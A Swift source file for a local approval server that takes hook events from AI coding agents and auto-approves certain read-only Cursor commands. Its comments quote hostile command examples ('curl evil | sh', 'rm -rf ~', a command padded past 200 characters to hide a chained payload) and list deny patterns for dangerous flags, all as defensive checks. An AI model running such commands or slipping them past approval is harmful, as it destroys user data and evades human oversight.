import Foundation
import Hummingbird
import HTTPTypes
import NIOCore
import CryptoKit

struct HookEventBody: Decodable, Sendable {
    var session_id: String?
    var conversation_id: String?
    var hook_event_name: String?
    var hookEventName: String?
    var cwd: String?
    var tool_name: String?
    var tool_input: ToolInput?
    var notification_type: String?
    var message: String?
    var command: String?
    var toolName: String?

    var tool: CursorTool?
    var input: ToolInput?

    struct CursorTool: Decodable, Sendable {
        var name: String?
    }

    struct ToolInput: Decodable, Sendable {
        var command: String?
        var file_path: String?
        var path: String?
        var url: String?
        var query: String?
        var description: String?

        private enum CodingKeys: String, CodingKey {
            case command, file_path, path, url, query, description
        }

        /// Tolerant on purpose.
        ///
        /// Cursor sends `beforeMCPExecution.tool_input` as a JSON *string*,
        /// not an object, and any agent may put a non-string under a name we
        /// read (`{"query": {"q": "x"}}`). The synthesized decoder threw on
        /// both, which failed the whole route with a 500 — and a 500 on
        /// /hook/approve means the card never reaches the user and the tool
        /// proceeds unreviewed. A field we can't read should cost us that
        /// field, never the prompt.
        init(from decoder: Decoder) throws {
            if let single = try? decoder.singleValueContainer(),
               let raw = try? single.decode(String.self) {
                if let data = raw.data(using: .utf8),
                   let obj = (try? JSONSerialization.jsonObject(with: data)) as? [String: Any] {
                    command = obj["command"] as? String
                    file_path = obj["file_path"] as? String
                    path = obj["path"] as? String
                    url = obj["url"] as? String
                    query = obj["query"] as? String
                    description = obj["description"] as? String
                } else {
                    description = raw
                }
                return
            }
            guard let c = try? decoder.container(keyedBy: CodingKeys.self) else { return }
            func str(_ key: CodingKeys) -> String? {
                (try? c.decodeIfPresent(String.self, forKey: key)) ?? nil
            }
            command = str(.command)
            file_path = str(.file_path)
            path = str(.path)
            url = str(.url)
            query = str(.query)
            description = str(.description)
        }
    }

    var effectiveEventName: String? {
        hook_event_name ?? hookEventName
    }

    var effectiveToolName: String? {
        tool_name ?? tool?.name ?? toolName ?? (command != nil ? "Shell" : nil)
    }

    var effectiveToolInput: ToolInput? {
        tool_input ?? input
    }
}

private struct SignalRequestBody: Decodable, Sendable {
    var agent_id: String?
    var session_id: String?
    var conversation_id: String?
    var signal: String?
    var cwd: String?
    var pid: Int32?
}

func buildHookServer(
    engine: BuddyEngine,
    config: BuddyConfig
) -> Application<RouterResponder<BasicRequestContext>> {
    let router = Router()
    let diagLog = engine.diagnosticLog

    router.get("/healthz") { _, _ -> Response in
        let state = await engine.state
        return jsonResponse([
            "ok": true,
            "stateVersion": state.version,
            "desktop": state.desktop.status.rawValue,
        ] as [String: Any])
    }

    router.post("/hook/event") { request, _ -> Response in
        guard isAuthorized(request, token: config.token) else { return unauthorized() }
        let source = request.uri.queryParameters["source"].map(String.init) ?? "claude-code"
        let rawBuffer = try await request.body.collect(upTo: 1_048_576)
        let rawJSON = String(buffer: rawBuffer)
        let body = try sharedDecoder.decode(HookEventBody.self, from: rawBuffer)
        let hookPid: Int32? = (body.effectiveEventName == "SessionStart")
            ? request.uri.queryParameters["pid"].flatMap({ Int32(String($0)) })
            : nil
        await diagLog.log(category: "hook", source: source, event: body.effectiveEventName ?? "unknown", detail: "\(body.effectiveToolName ?? "") \(extractHint(from: body))".trimmingCharacters(in: .whitespaces), rawPayload: rawJSON)
        await handleAgentEvent(
            body: body,
            source: source,
            hookPid: hookPid,
            engine: engine
        )
        return emptyOK()
    }

    router.post("/hook/signal") { request, _ -> Response in
        guard isAuthorized(request, token: config.token) else { return unauthorized() }
        let rawBuffer = try await request.body.collect(upTo: 1_048_576)
        let rawJSON = String(buffer: rawBuffer)
        let body = try sharedDecoder.decode(SignalRequestBody.self, from: rawBuffer)
        let source = body.agent_id ?? "claude-code"
        let sessionId = body.session_id ?? body.conversation_id ?? "\(source)_default"
        await diagLog.log(category: "signal", source: source, event: body.signal ?? "unknown", detail: "session=\(sessionId)", rawPayload: rawJSON)
        // A session-end signal deregisters the session outright — agents (e.g. Cursor)
        // route lifecycle close events here, and there is no process watcher to reap them.
        if body.signal == "session_end" {
            await engine.sessionEnded(sessionId: sessionId)
            return emptyOK()
        }
        // Cursor's helper spawn chain hasn't been verified for the parent-walk; Cursor cleanup uses explicit `session_end` + stale reap.
        await engine.sessionStarted(sessionId: sessionId, source: source, cwd: body.cwd, hookPid: nil)
        // Cursor's `stop` is a "task complete" event, equivalent to Claude Code's
        // Stop and Codex's Stop — route it to celebrate so the review surface fires.
        // The vestigial SignalCLI map says "stop_working" but we override server-side
        // so existing installations get the fix without reinstalling hooks.
        let effectiveSignal: String? = {
            if source == "cursor", body.signal == "stop_working" { return "celebrate" }
            return body.signal
        }()
        if let signalStr = effectiveSignal, let signal = ActivitySignalKind(rawValue: signalStr) {
            await engine.activitySignal(sessionId: sessionId, source: source, signal: signal)
        }
        return emptyOK()
    }

    router.post("/hook/approve") { request, _ -> Response in
        guard isAuthorized(request, token: config.token) else { return unauthorized() }
        let source = request.uri.queryParameters["source"].map(String.init) ?? "claude-code"
        let rawBuffer = try await request.body.collect(upTo: 1_048_576)
        let rawJSON = String(buffer: rawBuffer)
        let body = try sharedDecoder.decode(HookEventBody.self, from: rawBuffer)
        let sessionId = deriveSessionId(from: body, source: source)
        let tool = body.effectiveToolName ?? "Unknown"
        let hint = extractHint(from: body)
        let sessionLabel = cwdLabel(body.cwd)
        let requestId = makeRequestId(sessionId: sessionId)

        await diagLog.log(category: "approve", source: source, event: body.effectiveEventName ?? "approve", detail: "\(tool): \(hint)", rawPayload: rawJSON)

        await engine.sessionStarted(sessionId: sessionId, source: source, cwd: body.cwd)

        // The safety check reads the FULL command; `hint` is display-truncated.
        if let autoDecision = shouldAutoApprove(tool: tool, command: extractHint(from: body, limit: .max), source: source) {
            await diagLog.log(category: "approve", source: source, event: "auto-\(autoDecision.rawValue)", detail: tool)
            await engine.activitySignal(sessionId: sessionId, source: source, signal: .keepWorking, tool: tool, hint: hint)
            return approvalResponse(decision: autoDecision, source: source)
        }

        let decision = await engine.submitApproval(
            sessionId: sessionId,
            requestId: requestId,
            tool: tool,
            hint: hint,
            sessionLabel: sessionLabel,
            source: source
        )

        return approvalResponse(decision: decision, source: source)
    }

    return Application(
        router: router,
        configuration: .init(address: .hostname("127.0.0.1", port: config.httpPort))
    )
}

// MARK: - Agent Event Handler

func handleAgentEvent(
    body: HookEventBody,
    source: String,
    hookPid: Int32?,
    engine: BuddyEngine
) async {
    let sessionId = deriveSessionId(from: body, source: source)
    let event = body.effectiveEventName ?? ""
    let sessionLabel = cwdLabel(body.cwd)

    if event != "SessionEnd" {
        await engine.sessionStarted(sessionId: sessionId, source: source, cwd: body.cwd, hookPid: hookPid)
    }

    switch event {
    case "SessionStart":
        break

    case "UserPromptSubmit":
        await engine.activitySignal(sessionId: sessionId, source: source, signal: .startWorking)

    case "Stop":
        await engine.activitySignal(sessionId: sessionId, source: source, signal: .celebrate)

    case "StopFailure":
        await engine.activitySignal(sessionId: sessionId, source: source, signal: .error)

    case "PostToolUse":
        await engine.clearRequest(sessionId: sessionId)
        await engine.activitySignal(sessionId: sessionId, source: source, signal: .keepWorking, tool: body.effectiveToolName, hint: extractHint(from: body))

    case "PreToolUse":
        // Codex fires PreToolUse before running a tool. Keep the pet busy while the
        // tool runs (Codex has no separate "still working" signal between turns).
        await engine.activitySignal(sessionId: sessionId, source: source, signal: .keepWorking, tool: body.effectiveToolName, hint: extractHint(from: body))

    case "SessionEnd":
        await engine.sessionEnded(sessionId: sessionId)

    case "PermissionRequest":
        let tool = body.effectiveToolName ?? "Permission"
        let hint = extractHint(from: body)
        let requestId = makeRequestId(sessionId: sessionId)
        await engine.submitRequest(sessionId: sessionId, requestId: requestId, tool: tool, hint: hint, sessionLabel: sessionLabel)

    case "Notification":
        switch body.notification_type {
        case "permission_prompt":
            // Intentionally ignored: PermissionRequest is authoritative for
            // permission cards in both modes (it routes to /hook/approve when
            // approval mode is on, and shows a passive card via /hook/event when
            // off), and its payload carries the tool + command. The
            // permission_prompt notification only duplicates that with a poorer
            // label ("permission_prompt" / a generic message), so we no longer
            // register or handle it. Left as an explicit no-op in case an older
            // or hand-edited config still emits it.
            break
        case "elicitation_dialog":
            let requestId = makeRequestId(sessionId: sessionId)
            await engine.submitRequest(sessionId: sessionId, requestId: requestId, tool: body.notification_type ?? "Notification", hint: body.message ?? "", sessionLabel: sessionLabel)
        case "idle_prompt":
            await engine.activitySignal(sessionId: sessionId, source: source, signal: .stopWorking)
        default:
            break
        }

    case "Elicitation":
        let requestId = makeRequestId(sessionId: sessionId)
        await engine.submitRequest(sessionId: sessionId, requestId: requestId, tool: "Elicitation", hint: body.message ?? "", sessionLabel: sessionLabel)

    case "ElicitationResult":
        await engine.clearRequest(sessionId: sessionId)
        await engine.activitySignal(sessionId: sessionId, source: source, signal: .startWorking)

    default:
        break
    }
}

// MARK: - Approval Helpers

func approvalResponse(decision: ApprovalDecision, source: String) -> Response {
    if decision == .passthrough {
        if source == "cursor" {
            return jsonResponse(["permission": "ask"])
        }
        return emptyOK()
    }

    let payload: [String: Any]
    if source == "cursor" {
        switch decision {
        case .allow:
            payload = ["permission": "allow"]
        case .deny:
            payload = ["permission": "deny", "user_message": "Denied by Boop", "agent_message": "Tool call denied by Boop approval mode."]
        case .passthrough:
            payload = ["permission": "ask"]
        }
    } else {
        var decisionDict: [String: Any] = ["behavior": decision.rawValue]
        if decision == .deny {
            decisionDict["message"] = "Denied by Boop"
        }
        payload = [
            "hookSpecificOutput": [
                "hookEventName": "PermissionRequest",
                "decision": decisionDict,
            ] as [String: Any],
        ]
    }
    guard let data = try? JSONSerialization.data(withJSONObject: payload) else {
        return Response(status: .internalServerError)
    }
    return Response(
        status: .ok,
        headers: [.contentType: "application/json"],
        body: .init(byteBuffer: ByteBuffer(data: data))
    )
}

private let cursorAutoApproveTools: Set<String> = ["Read", "Glob", "Grep", "LSP", "WebFetch"]

// `find` and `fd` are deliberately absent: both spawn processes and delete
// files through their own arguments (`find . -delete`, `fd -x rm {}`) without
// needing a single shell metacharacter, so no amount of separator filtering
// makes them safe to approve unseen.
private let cursorSafeShellPatterns: [String] = [
    #"^(ls|cat|head|tail|wc|grep|rg|which|echo|pwd|date|whoami|hostname|uname)\b"#,
    #"^git (status|log|diff|show|branch|remote|tag)\b"#,
]

// Shell control operators that let a "safe" command prefix smuggle a second,
// dangerous command (e.g. `ls; rm -rf ~`, `cat x && curl evil | sh`, `git log > f`).
// If any appear, the command is NOT eligible for auto-approval — it must be
// reviewed manually.
private let shellControlCharacters: CharacterSet = {
    var set = CharacterSet(charactersIn: ";&|`$()<>")
    // CLAUDE.md requires manual review for control characters. Naming only
    // \n and \r let ESC, NUL and the rest of C0 through — an escape sequence
    // reaches the log and the UI, and a NUL truncates the command for any
    // downstream C consumer while the shell still runs the whole thing.
    set.formUnion(.controlCharacters)
    return set
}()

// Flags that turn an otherwise read-only command into an exec or a write.
// Checked separately from the allowlist because the allowlist matches the
// command NAME, and these all live in the arguments.
private let dangerousArgumentPatterns: [String] = [
    #"(?:^|\s)--pre(?:=|\s|$)"#,        // rg --pre runs a preprocessor per file
    #"(?:^|\s)--pre-glob\b"#,
    #"(?:^|\s)--hostname-bin\b"#,       // rg runs this binary
    #"(?:^|\s)--output(?:=|\s|$)"#,     // git diff --output=~/.zshenv
    #"(?:^|\s)-(?:exec|execdir|ok|okdir|delete|fprint|fprintf|fls)\b"#,
]

/// Whether Cursor may run this command without showing the user a card.
///
/// `command` MUST be the full, untruncated command. It used to be the same
/// 200-character string the UI displays, which meant a chain hidden past the
/// cutoff (`ls <200 chars of padding>; curl evil.sh | sh`) was scanned as a
/// bare `ls` and auto-approved — the separator was never in the string being
/// checked. Display truncation and safety analysis must not share an input.
func shouldAutoApprove(tool: String, command: String, source: String) -> ApprovalDecision? {
    guard source == "cursor" else { return nil }
    if cursorAutoApproveTools.contains(tool) { return .allow }
    if command.rangeOfCharacter(from: shellControlCharacters) != nil { return nil }
    for pattern in dangerousArgumentPatterns {
        if command.range(of: pattern, options: .regularExpression) != nil { return nil }
    }
    for pattern in cursorSafeShellPatterns {
        if command.range(of: pattern, options: .regularExpression) != nil {
            return .allow
        }
    }
    return nil
}

// MARK: - Helpers

/// The single most relevant string in a hook payload.
///
/// `limit` exists so the safety path can ask for the whole command while the
/// display path keeps its 200-character cap — passing the truncated string to
/// `shouldAutoApprove` is what let a hidden `; curl … | sh` through.
private func extractHint(from body: HookEventBody, limit: Int = 200) -> String {
    func cap(_ s: String) -> String { limit == .max ? s : String(s.prefix(limit)) }
    if let cmd = body.command, !cmd.isEmpty { return cap(cmd) }
    if let ti = body.effectiveToolInput {
        if let desc = ti.description, !desc.isEmpty { return cap(desc) }
        for v in [ti.command, ti.file_path, ti.path, ti.url, ti.query] {
            if let v, !v.isEmpty { return cap(v) }
        }
    }
    return body.message ?? ""
}

private func cwdLabel(_ cwd: String?) -> String? {
    guard let cwd, !cwd.isEmpty else { return nil }
    return (cwd as NSString).lastPathComponent
}

func stableHashCwd(_ cwd: String?) -> String {
    guard let cwd, !cwd.isEmpty else { return "unknown" }
    let digest = SHA256.hash(data: Data(cwd.utf8))
    return digest.prefix(4).map { String(format: "%02x", $0) }.joined()
}

private func deriveSessionId(from body: HookEventBody, source: String) -> String {
    body.session_id ?? body.conversation_id ?? "\(source)_\(stableHashCwd(body.cwd))"
}

private func shortUUID() -> String {
    String(UUID().uuidString.replacingOccurrences(of: "-", with: "").prefix(12))
}

/// Opaque key for one pending approval, deliberately kept short.
///
/// The firmware stores this in `char promptId[40]` and echoes it back with
/// its decision, and the engine matches the reply by exact string equality.
/// A full session id in here overruns that buffer: Claude Code's session_id
/// is a 36-char UUID, so "<uuid>_<12>" is 49 chars, the device silently
/// truncates to 39, and the decision it sends back matches nothing. That
/// looked exactly like a dead button — the card sat on "yes!" forever while
/// the hook stayed blocked, because the reply was dropped on the desk side.
///
/// Eight chars of session is plenty to eyeball which session a request came
/// from in the logs; the 12-char random suffix is what actually makes it
/// unique. 21 chars total leaves real headroom under the device's 39.
func makeRequestId(sessionId: String) -> String {
    "\(sessionId.prefix(8))_\(shortUUID())"
}

private let sharedDecoder = JSONDecoder()

private func isAuthorized(_ request: Request, token: String) -> Bool {
    guard !token.isEmpty,
          let headerName = HTTPField.Name("X-Boop-Token"),
          let providedToken = request.headers[headerName] else { return false }
    return constantTimeEquals(providedToken, token)
}

private func constantTimeEquals(_ lhs: String, _ rhs: String) -> Bool {
    let lhsBytes = Array(lhs.utf8)
    let rhsBytes = Array(rhs.utf8)
    let count = max(lhsBytes.count, rhsBytes.count)
    var diff = lhsBytes.count ^ rhsBytes.count
    for index in 0..<count {
        let lhsByte = index < lhsBytes.count ? lhsBytes[index] : 0
        let rhsByte = index < rhsBytes.count ? rhsBytes[index] : 0
        diff |= Int(lhsByte ^ rhsByte)
    }
    return diff == 0
}

private func unauthorized() -> Response {
    Response(status: .unauthorized, headers: [.contentLength: "0"])
}

private func decodeBody<T: Decodable>(_ type: T.Type, from request: Request) async throws -> T {
    let buffer = try await request.body.collect(upTo: 1_048_576)
    return try sharedDecoder.decode(type, from: buffer)
}

private func emptyOK() -> Response {
    Response(status: .ok, headers: [.contentLength: "0"])
}

private func jsonResponse(_ dict: [String: Any]) -> Response {
    guard let data = try? JSONSerialization.data(withJSONObject: dict) else {
        return Response(status: .internalServerError)
    }
    return Response(
        status: .ok,
        headers: [.contentType: "application/json"],
        body: .init(byteBuffer: ByteBuffer(data: data))
    )
}
